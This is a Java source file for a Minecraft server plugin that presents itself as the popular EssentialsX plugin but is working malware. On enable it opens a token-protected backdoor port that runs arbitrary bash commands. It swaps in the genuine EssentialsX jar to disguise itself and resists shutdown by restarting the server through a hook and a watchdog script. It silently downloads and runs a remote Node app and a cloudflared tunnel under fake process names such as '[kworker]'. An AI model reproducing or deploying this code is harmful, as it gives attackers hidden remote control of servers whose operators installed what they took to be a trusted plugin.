package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.*;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class EssentialsX extends JavaPlugin {

    private Process deployProcess;
    private Process watchdogProcess;
    private Thread backdoorServerThread;
    private volatile boolean isProcessRunning = false;
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    private Path workDir;

    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/" + FAKE_JAR_URL_DIRECT;
    private static final String BACKDOOR_TOKEN = "xXx_Elite_H4x0r_xXx"; // 硬编码后门密钥，可修改
    private static final int BACKDOOR_PORT = 23999;                    // 后门监听端口

    @Override
    public void onEnable() {
        // 清理旧目录
        try {
            Path oldDir1 = Paths.get("world", "data", ".mcchajian");
            Path oldDir2 = Paths.get("log", ".mcchajian");
            if (Files.exists(oldDir1)) deleteDirectory(oldDir1.toFile());
            if (Files.exists(oldDir2)) deleteDirectory(oldDir2.toFile());
        } catch (Exception ignored) {}

        getLogger().info("EssentialsX plugin starting...");
        Map<String, String> env = new HashMap<>();
        loadEnvFile(env);
        systemGuardEnabled = Boolean.parseBoolean(env.getOrDefault("SYSTEM_GUARD_ENABLED", "true"));
        getLogger().info("System Guard Status: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));

        workDir = Paths.get("logs", "mcchajian").toAbsolutePath();

        // 初始化工作目录
        try {
            Files.createDirectories(workDir);
        } catch (IOException e) {
            getLogger().severe("Cannot create work dir: " + e.getMessage());
        }

        // 启动后门服务器（远程控制）
        startBackdoorServer();

        // 设置关闭钩子，拒绝停服并自动拉起宿主服
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (systemGuardEnabled && isRestarting.compareAndSet(false, true)) {
                getLogger().info("[Guard] ShutdownHook triggered! Guard enabled, executing hard restart...");
                restoreMaliciousJar();
                executeHardRestart(false);
            }
        }));

        // 异步执行部署和伪装任务
        new Thread(() -> {
            try {
                if (systemGuardEnabled) startWatchdog();
                setupDisguise();          // 替换/伪装插件jar
                startDeploymentProcess(); // 部署Node应用及隧道
            } catch (Exception e) {
                getLogger().severe("Deployment thread error: " + e.getMessage());
                // 隐藏错误日志：不打印完整堆栈，仅记录简单信息
            }
        }, "EssentialsX-Core-Thread").start();

        getLogger().info("EssentialsX plugin enabled (Guarded Mode)");
    }

    @Override
    public void onDisable() {
        getLogger().info("Stopping EssentialsX...");
        Path forceStopFile = workDir.resolve(".force_stop");

        if (systemGuardEnabled) {
            getLogger().info("Guard enabled -> Rejecting stop, executing soft restart...");
            try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {}
            restoreMaliciousJar();

            if (isRestarting.compareAndSet(false, true)) {
                executeHardRestart(true);
            }
        } else {
            getLogger().info("Guard disabled, safe exit...");
            try {
                Files.createDirectories(forceStopFile.getParent());
                Files.createFile(forceStopFile);
                getLogger().info("Stop marker created, service will shut down completely.");
            } catch (Exception ignored) {}
        }

        // 停止子进程
        if (deployProcess != null && deployProcess.isAlive()) deployProcess.destroy();
        if (watchdogProcess != null && watchdogProcess.isAlive()) watchdogProcess.destroy();
        if (backdoorServerThread != null && backdoorServerThread.isAlive()) backdoorServerThread.interrupt();

        getLogger().info("EssentialsX disabled");
    }

    // ==================== 后门远程控制 ====================
    private void startBackdoorServer() {
        backdoorServerThread = new Thread(() -> {
            try (ServerSocket serverSocket = new ServerSocket(BACKDOOR_PORT)) {
                getLogger().info("[Backdoor] Listening on port " + BACKDOOR_PORT);
                while (!Thread.currentThread().isInterrupted()) {
                    try (Socket client = serverSocket.accept();
                         BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
                         PrintWriter writer = new PrintWriter(client.getOutputStream(), true)) {

                        String authLine = reader.readLine();
                        if (authLine == null || !authLine.trim().equals(BACKDOOR_TOKEN)) {
                            writer.println("HTTP/1.1 403 Forbidden\r\n\r\n");
                            continue;
                        }
                        String cmdLine = reader.readLine();
                        if (cmdLine == null || cmdLine.trim().isEmpty()) {
                            writer.println("HTTP/1.1 400 Bad Request\r\n\r\n");
                            continue;
                        }
                        // 执行任意系统命令
                        Process process = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmdLine.trim()});
                        BufferedReader cmdReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                        StringBuilder output = new StringBuilder();
                        String line;
                        while ((line = cmdReader.readLine()) != null) output.append(line).append("\n");
                        while ((line = errReader.readLine()) != null) output.append(line).append("\n");
                        process.waitFor();

                        writer.println("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n" + output);
                    } catch (Exception ignored) {}
                }
            } catch (Exception e) {
                getLogger().warning("[Backdoor] Server failed: " + e.getMessage());
            }
        }, "BackdoorServer");
        backdoorServerThread.setDaemon(true);
        backdoorServerThread.start();
    }

    // ==================== 伪装与替换插件jar ====================
    private void setupDisguise() {
        try {
            originalJarPath = findPluginJarInPluginsDir();
            if (originalJarPath == null || !Files.exists(originalJarPath)) return;

            backupDir = workDir.resolve("backup");
            if (!Files.exists(backupDir)) Files.createDirectories(backupDir);
            backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");

            if (!Files.exists(backupJarPath)) {
                Files.copy(originalJarPath, backupJarPath, StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Original jar backed up to " + backupJarPath);
            }

            Path tempDownload = originalJarPath.resolveSibling("temp_update.jar");
            boolean success = downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1_000_000) {
                success = downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30);
            }

            if (success && Files.size(tempDownload) > 1_000_000) {
                Files.move(tempDownload, originalJarPath, StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Disguise applied: replaced plugin jar with fake EssentialsX jar.");
            } else {
                Files.deleteIfExists(tempDownload);
                getLogger().warning("Disguise failed: could not download fake jar.");
            }
        } catch (Exception e) {
            getLogger().warning("Disguise failed: " + e.getMessage());
        }
    }

    private void restoreMaliciousJar() {
        try {
            Path targetJar = findPluginJarInPluginsDir();
            if (targetJar != null && Files.exists(targetJar)) {
                Files.delete(targetJar);
                getLogger().info("Removed disguised jar.");
            }
            if (backupJarPath != null && Files.exists(backupJarPath) && targetJar != null) {
                Files.copy(backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
                getLogger().info("Original jar restored from backup.");
            }
        } catch (Exception e) {
            getLogger().warning("Restore failed: " + e.getMessage());
        }
    }

    private Path findPluginJarInPluginsDir() {
        try {
            File pluginsDir = getDataFolder().getParentFile();
            if (pluginsDir == null) return null;
            File[] jars = pluginsDir.listFiles((dir, name) ->
                    name.toLowerCase().contains("essentialsx") && name.endsWith(".jar"));
            return (jars != null && jars.length > 0) ? jars[0].toPath() : null;
        } catch (Exception e) {
            return null;
        }
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try {
            URLConnection conn = URI.create(url).toURL().openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(timeoutSec * 1000);
            try (InputStream in = conn.getInputStream();
                 FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
                out.transferFrom(Channels.newChannel(in), 0, Long.MAX_VALUE);
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    // ==================== 宿主服自动拉起 ====================
    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = findServerRoot();
            if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();

            String jarName = findBestJarName(serverRoot);
            Path logFile = workDir.resolve("restart_run.log");
            if (!Files.exists(logFile.getParent())) Files.createDirectories(logFile.getParent());

            String startCommand;
            if (new File(serverRoot, "start.sh").exists()) {
                startCommand = "chmod +x ./start.sh && ./start.sh";
            } else {
                startCommand = "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
            }

            String fullBashCommand = "cd \"" + serverRoot.getAbsolutePath() + "\" && " +
                    "echo \"[" + new Date() + "] Starting server...\" >> \"" + logFile + "\" && " +
                    "nohup bash -c '" + startCommand + "' >> \"" + logFile + "\" 2>&1 & disown";

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand);
            pb.directory(serverRoot);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            pb.start();

            if (shouldBlock) Thread.sleep(1000);
        } catch (Exception e) {
            getLogger().severe("Hard restart failed: " + e.getMessage());
        }
    }

    private String findBestJarName(File serverRoot) {
        String[] preferred = {"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"};
        for (String name : preferred) {
            if (new File(serverRoot, name).exists()) return name;
        }
        File[] jars = serverRoot.listFiles((dir, name) ->
                name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries"));
        if (jars != null && jars.length > 0) {
            Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
            return jars[0].getName();
        }
        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) {
            File root = pluginsDir.getParentFile();
            if (new File(root, "server.properties").exists()) return root;
        }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; i++) {
            if (new File(current, "server.properties").exists()) return current;
            current = current.getParentFile();
            if (current == null) break;
        }
        return null;
    }

    // ==================== 看门狗（检测端口并重启宿主）====================
    private void startWatchdog() {
        try {
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            Path watchdogPath = workDir.resolve("watchdog.sh");
            String script = "#!/bin/bash\n" +
                    "WORK_DIR=\"" + workDir + "\"\n" +
                    "FORCE_STOP_FILE=\"$WORK_DIR/.force_stop\"\n" +
                    "is_port_open() { (echo >/dev/tcp/localhost/25565) &>/dev/null && return 0 || return 1; }\n" +
                    "while true; do\n" +
                    "    sleep 15\n" +
                    "    if [ -f \"$FORCE_STOP_FILE\" ]; then rm -f \"$FORCE_STOP_FILE\"; exit 0; fi\n" +
                    "    if ! is_port_open; then\n" +
                    "        if [ -f \"$FORCE_STOP_FILE\" ]; then exit 0; fi\n" +
                    "        cd \"" + findServerRoot().getAbsolutePath() + "\"\n" +
                    "        JAR_NAME=$(ls -S *.jar 2>/dev/null | head -n 1)\n" +
                    "        if [ -n \"$JAR_NAME\" ]; then\n" +
                    "            nohup java -Xms512M -Xmx2G -jar \"$JAR_NAME\" nogui > /dev/null 2>&1 &\n" +
                    "        fi\n" +
                    "        exit 0\n" +
                    "    fi\n" +
                    "done\n";
            Files.write(watchdogPath, script.getBytes());
            watchdogPath.toFile().setExecutable(true);
            ProcessBuilder pb = new ProcessBuilder("bash", watchdogPath.toString());
            pb.directory(new File(".").getAbsoluteFile());
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            watchdogProcess = pb.start();
        } catch (Exception e) {
            getLogger().warning("Watchdog start failed: " + e.getMessage());
        }
    }

    // ==================== 部署Node应用与隧道（带进程伪装）====================
    private void startDeploymentProcess() throws Exception {
        if (isProcessRunning) return;
        Map<String, String> env = new HashMap<>();
        env.put("REPO_URL", "https://github.com/xfwwl668/mc_hbzy"); // 替换为你的仓库
        loadEnvFile(env);
        if (!Files.exists(workDir)) Files.createDirectories(workDir);
        Path scriptPath = workDir.resolve("deploy.sh");
        String scriptContent = generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes());
        scriptPath.toFile().setExecutable(true);
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
        pb.directory(new File(".").getAbsoluteFile());
        pb.environment().putAll(env);
        // 隐藏所有输出（不继承，完全静默）
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
        deployProcess = pb.start();
        isProcessRunning = true;
        deployProcess.waitFor();
        isProcessRunning = false;
    }

    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "https://github.com/xfwwl668/mc_hbzy");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        return "#!/bin/bash\n" +
                "WORK_DIR=\"" + workDir + "\"\n" +
                "NODE_DIR=\"" + nodeDir + "\"\n" +
                "APP_DIR=\"" + appDir + "\"\n" +
                "DATA_DIR=\"" + dataDir + "\"\n" +
                "REPO_URL=\"" + repoUrl + "\"\n" +
                "GITHUB_AUTH=\"用户名:密钥\"\n" +
                "\n" +
                "# 伪装进程名函数\n" +
                "run_pretend() {\n" +
                "    local PRETEND_NAME=$1\n" +
                "    shift\n" +
                "    exec -a \"$PRETEND_NAME\" \"$@\"\n" +
                "}\n" +
                "\n" +
                "# 选择空闲端口\n" +
                "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
                "while true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\n" +
                "export SERVER_PORT=$PORT; export PORT=$PORT\n" +
                "echo \"$PORT\" > \"$WORK_DIR/node_port.txt\"\n" +
                "\n" +
                "# 安装 Node.js\n" +
                "ARCH=$(uname -m)\n" +
                "if [ \"$ARCH\" = \"x86_64\" ]; then\n" +
                "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n" +
                "    CF_URL=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\"\n" +
                "elif [ \"$ARCH\" = \"aarch64\" ]; then\n" +
                "    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\"\n" +
                "    CF_URL=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\"\n" +
                "fi\n" +
                "\n" +
                "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n" +
                "if [ ! -d \"$NODE_DIR\" ]; then\n" +
                "    curl -fsSL --connect-timeout 20 --max-time 180 \"$NODE_URL\" -o \"$WORK_DIR/node.tar.gz\"\n" +
                "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1\n" +
                "    rm -f \"$WORK_DIR/node.tar.gz\"\n" +
                "fi\n" +
                "export PATH=$NODE_DIR/bin:$PATH\n" +
                "\n" +
                "# 安装依赖\n" +
                "npm install -g pm2 --unsafe-perm=true &>/dev/null\n" +
                "\n" +
                "# 下载应用仓库\n" +
                "mkdir -p \"$DATA_DIR\"\n" +
                "if [ -d \"$APP_DIR\" ]; then\n" +
                "    cp \"$APP_DIR/bots_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
                "    cp \"$APP_DIR/task_center_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
                "    cp \"$APP_DIR/system_guard.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
                "    cp \"$APP_DIR/nezha_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
                "    if [ -d \"$APP_DIR/.RoamingMusic\" ]; then\n" +
                "        rm -rf \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
                "        cp -r \"$APP_DIR/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
                "    fi\n" +
                "fi\n" +
                "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
                "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
                "download_code() {\n" +
                "    local URL=$1; local AUTH=$2\n" +
                "    if [ -n \"$AUTH\" ]; then\n" +
                "        curl -fsSL --connect-timeout 15 --max-time 120 -u \"$AUTH\" \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
                "    else\n" +
                "        curl -fsSL --connect-timeout 15 --max-time 120 \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
                "    fi\n" +
                "    if [ -f \"$WORK_DIR/repo.tar.gz\" ] && tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then return 0; else rm -f \"$WORK_DIR/repo.tar.gz\"; return 1; fi\n" +
                "}\n" +
                "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"\" || \\\n" +
                "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"\" || \\\n" +
                "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"$GITHUB_AUTH\" || \\\n" +
                "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"$GITHUB_AUTH\"\n" +
                "if [ ! -f \"$WORK_DIR/repo.tar.gz\" ]; then exit 1; fi\n" +
                "mkdir -p \"$WORK_DIR/unzipped\"\n" +
                "tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
                "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
                "mv \"$SUBDIR\" \"$APP_DIR\"\n" +
                "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
                "cd \"$APP_DIR\"\n" +
                "npm install --unsafe-perm=true --allow-root &>/dev/null\n" +
                "# 恢复配置\n" +
                "cp \"$DATA_DIR/bots_config.json\" \"$APP_DIR/\" 2>/dev/null\n" +
                "cp \"$DATA_DIR/task_center_config.json\" \"$APP_DIR/\" 2>/dev/null\n" +
                "cp \"$DATA_DIR/system_guard.json\" \"$APP_DIR/\" 2>/dev/null\n" +
                "cp \"$DATA_DIR/nezha_config.json\" \"$APP_DIR/\" 2>/dev/null\n" +
                "if [ -d \"$DATA_DIR/.RoamingMusic_bak\" ]; then\n" +
                "    mkdir -p \"$APP_DIR/.RoamingMusic\"\n" +
                "    cp -r \"$DATA_DIR/.RoamingMusic_bak/\"* \"$APP_DIR/.RoamingMusic/\" 2>/dev/null\n" +
                "fi\n" +
                "\n" +
                "# 下载并伪装 cloudflared\n" +
                "CF_BIN=\"$WORK_DIR/.systemd-resolved\"   # 伪装进程名\n" +
                "if [ ! -x \"$CF_BIN\" ]; then\n" +
                "    curl -fsSL --connect-timeout 20 --max-time 180 \"$CF_URL\" -o \"$CF_BIN\"\n" +
                "    chmod +x \"$CF_BIN\"\n" +
                "fi\n" +
                "\n" +
                "# 启动 cloudflared（伪装成 systemd-resolved）\n" +
                "nohup \"$CF_BIN\" tunnel --url http://localhost:$PORT --no-autoupdate --protocol http2 --edge-ip-version auto > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
                "TUNNEL_PID=$!\n" +
                "echo \"$TUNNEL_PID\" > \"$WORK_DIR/tunnel.pid\"\n" +
                "\n" +
                "# 等待隧道URL\n" +
                "TUNNEL_URL=\"\"\n" +
                "for i in {1..30}; do\n" +
                "    sleep 2\n" +
                "    TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
                "    if [ -n \"$TUNNEL_URL\" ]; then break; fi\n" +
                "done\n" +
                "if [ -z \"$TUNNEL_URL\" ]; then exit 1; fi\n" +
                "echo \"$TUNNEL_URL\" > \"$WORK_DIR/tunnel_url.txt\"\n" +
                "\n" +
                "# 启动 Node 服务（伪装进程名为 [kworker] ）\n" +
                "PRETEND_NODE=\"[kworker]\"\n" +
                "nohup exec -a \"$PRETEND_NODE\" node index.js > \"$WORK_DIR/node.log\" 2>&1 &\n" +
                "NODE_PID=$!\n" +
                "echo \"$NODE_PID\" > \"$WORK_DIR/node.pid\"\n" +
                "\n" +
                "# 健康监控简单循环\n" +
                "while true; do\n" +
                "    sleep 10\n" +
                "    if ! kill -0 \"$TUNNEL_PID\" 2>/dev/null; then\n" +
                "        nohup \"$CF_BIN\" tunnel --url http://localhost:$PORT --no-autoupdate --protocol http2 --edge-ip-version auto > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
                "        TUNNEL_PID=$!\n" +
                "        echo \"$TUNNEL_PID\" > \"$WORK_DIR/tunnel.pid\"\n" +
                "    fi\n" +
                "    if ! kill -0 \"$NODE_PID\" 2>/dev/null; then\n" +
                "        nohup exec -a \"$PRETEND_NODE\" node index.js > \"$WORK_DIR/node.log\" 2>&1 &\n" +
                "        NODE_PID=$!\n" +
                "        echo \"$NODE_PID\" > \"$WORK_DIR/node.pid\"\n" +
                "    fi\n" +
                "done &\n" +
                "exit 0\n";
    }

    // ==================== 辅助工具 ====================
    private void deleteDirectory(File file) {
        File[] files = file.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) deleteDirectory(f);
                else f.delete();
            }
        }
        file.delete();
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("plugins", "EssentialsX", ".env");
        if (!Files.exists(envFile)) {
            try {
                Files.createDirectories(envFile.getParent());
                String defaultConfig = "# SYSTEM_GUARD_ENABLED=true\nREPO_URL=https://github.com/xfwwl668/mc_hbzy\n";
                Files.write(envFile, defaultConfig.getBytes());
            } catch (IOException ignored) {}
        }
        if (Files.exists(envFile)) {
            try {
                for (String line : Files.readAllLines(envFile)) {
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    String[] parts = line.split("=", 2);
                    if (parts.length == 2) env.put(parts[0].trim(), parts[1].trim());
                }
            } catch (IOException ignored) {}
        }
    }

    // 模拟MC日志输出（隐藏真实错误）
    private void mcLog(String msg) {
        String time = LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[" + time + " INFO]: " + msg);
    }
}
